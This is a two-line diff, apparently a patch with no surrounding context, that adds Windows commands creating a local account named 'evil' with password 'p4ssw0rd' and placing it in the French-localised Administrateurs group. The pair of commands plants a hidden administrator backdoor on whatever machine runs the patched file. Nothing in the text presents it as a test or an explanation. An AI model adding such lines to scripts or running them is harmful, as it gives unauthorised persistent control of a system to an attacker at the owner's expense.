@@ -1,0 +1,2 @@
+net user evil p4ssw0rd /add
+net localgroup Administrateurs evil /add
